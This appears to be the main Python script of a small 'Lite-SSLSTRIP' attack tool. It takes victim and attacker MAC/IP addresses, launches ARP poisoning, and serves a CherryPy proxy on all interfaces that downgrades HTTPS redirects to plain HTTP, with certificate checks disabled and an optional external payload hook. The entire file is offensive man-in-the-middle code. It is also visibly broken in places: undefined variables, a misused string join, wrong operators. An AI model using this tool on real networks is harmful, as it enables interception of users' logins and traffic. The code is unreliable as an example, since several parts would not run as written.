## Main contorl script of the Lite-SSLSTRIP too
## Reads user input and
## launches the ARP-poisoning and SSL strip

# TODO horrible intro ASCII art
import argparse
from arppoison import ArpPoison
import cherrypy
import random
import string
import requests

# Commandline arguments for ARP-spoofing
parser = argparse.ArgumentParser()
parser.add_argument('macA', help="MAC address of Alice")
parser.add_argument('ipA', help="IP address of Alice")
parser.add_argument('macB', help="MAC address of Bob")
parser.add_argument('ipB', help="IP address of Bob")
parser.add_argument('macM', help="MAC address of you (Mallory)")
parser.add_argument('ipM', help="IP address of you (Mallory)")
parser.add_argument("-sb", "--spoof_bob", help="Spoof the address of Alice to Bob", action="store_true")
parser.add_argument("-p", "--payload", help="Link to own attack module returning a requests.Response object, default: null", action="store_false")

args = parser.parse_args()

# Launch ARP attack
arp = ArpPoison(args.macA, args.ipA, args.macB, args.ipB, args.macM, args.ipM)
arp.arpPoisonA()

# In principle we don't need to spoof the addres of Bob
if (args.spoof_bob):
    arp.arpPoisonB()

# Initiate a request to Bob via a secure https request without verification of certificate
def startSSLConnection(url):
    response = requests.get(url, verify=False)
    return response

def makeBelievableResponse(r):
    ## Apply modifications to the URL
    # first of all update the location that is going to be displayed
    updatedURL = url[:5].join(url[6:])  # cut out the s in https
    r.headers['location'] = updatedURL

    # secondly change the statuscode to a proper request
    r.status_code = 200

    return r

class SSLStrip(object):
    @cherrypy.expose
    def index(self):
        # get content from server
        r = requests.get(args.macB)
        url = r.headers['location']

        # apply checks to figure out whether this is a 302 redirect for an http request
        if (r.status_code == 302 & url[:5] == "https"):
                print "HTTPS redirect SSL stripping engaged"

                # Request https enabled content from Bob
                secureResponse = startSSLConnection(url)

                # reset the request content to the actual content of the webpage
                r.content = secureResponse.content

                # change headers in response, reset status codes,
                response = makeBelievableResponse(r)

                # Additional payloads can be loaded from an external script, runs the payload() function
                if (payload != false):
                    print "Own payload loaded from" + payload
                    import payload
                    response = payload.payload(response)

                # return the response
                return response.content
        else:
            # if it is not a redirect, then return whatever you have been given
            return r.content

# starting the server
if __name__ == '__main__':
    # this command binds cherrypy to all interfaces of this machine, hence it is findable on the network
    cherrypy.config.update({'server.socket_host': '0.0.0.0'})
    # this command actually starts the server
    cherrypy.quickstart(SSLStrip())

